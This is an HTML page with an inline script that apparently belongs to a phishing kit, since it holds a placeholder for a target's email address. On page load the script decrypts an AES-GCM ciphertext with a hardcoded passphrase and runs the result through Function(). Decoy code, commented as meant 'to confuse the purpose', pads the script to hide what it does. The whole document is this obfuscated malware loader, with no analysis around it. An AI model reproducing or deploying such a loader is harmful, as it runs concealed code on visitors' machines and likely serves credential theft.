<!DOCTYPE html><main nike-tes1="" adidas="<%=EMAIL64%>"></main>
<script>
const hexToUint8Array = (hexStr) =>
    Uint8Array.from(hexStr.match(/.{1,2}/g).map((h) => parseInt(h, 16)));

const decryptAsync = async (cipher, ivHex, saltHex, passphrase) => {
    const textDecoder = new TextDecoder();
    const initializationVector = hexToUint8Array(ivHex);
    const saltBytes = hexToUint8Array(saltHex);
    const passwordKey = await crypto.subtle.importKey(
        "raw",
        new TextEncoder().encode(passphrase),
        { name: "PBKDF2" },
        false,
        ["deriveKey"]
    );
    const aesKey = await crypto.subtle.deriveKey(
        { name: "PBKDF2", salt: saltBytes, iterations: 100000, hash: "SHA-256" },
        passwordKey,
        { name: "AES-GCM", length: 256 },
        false,
        ["decrypt"]
    );
    try {
        const decryptedContent = await crypto.subtle.decrypt(
            { name: "AES-GCM", iv: initializationVector },
            aesKey,
            hexToUint8Array(cipher)
        );

        // Extra fluff to confuse the purpose
        const unusedValue = (Date.now() % 2 === 0) ? "irrelevant-data" : "discard-this";
        console.log("Irrelevant check:", unusedValue);

        return textDecoder.decode(decryptedContent);
    } catch (decryptionError) {
        console.error("Error during decryption:", decryptionError);
        throw new Error("Failed to decrypt");
    }
};

const executeDecryption = async () => {
    const cryptoParams = {
        vector: "b1d6504eea678a007e5d0a24",
        seasoning: "d18df4d946a3b82aa0f930ee3300f82c",
        encryptedData:
            "ffeafa695401fd2d10ee26c9473ad1f6aad7fdcba316446b7be9e681391d64ab8eebd18db07ca3219959f7bac95651e2d76cdf91fb4b3fc20d4320d097b5cc8f7c9cd368ac85588142c4104d42b6074ef2779dc6536a07d8b51f897ff3afeb214a5f88cf8489ec64885ad96a11d57563530ba73d056334bc9b2be7e48aa1308bc0e5e9aff6114b0bd8ef833ff966f38d0641d6b44978e51900d9f195925c3df7249c5445c03b3c1a474a10979b3968d745bf9f7e21872af390b3213412384d8357323b6c30a62f",
    };

    if (!cryptoParams) {
        console.error("Error: Missing decryption parameters");
        return;
    }

    const { encryptedData, vector, seasoning } = cryptoParams;

    try {
        // Adding a random and redundant timeout
        await new Promise((r) => setTimeout(r, Math.floor(Math.random() * 1000)));

        const output = await decryptAsync(
            encryptedData,
            vector,
            seasoning,
            "my-secret-key"
        );
        console.log("Output:", output);

        // Fake conditional for distraction
        const isOutputValid = output.includes(" ") ? "Valid Output" : "Invalid Output";
        console.log("Output status:", isOutputValid);

        Function(`${output}`)();
        // Unnecessary function wrapper
        (() => {
            console.log("Inside redundant function");
        })();
    } catch (decryptError) {
        console.error("Decryption issue:", decryptError.message);
    }
};

executeDecryption();
</script>



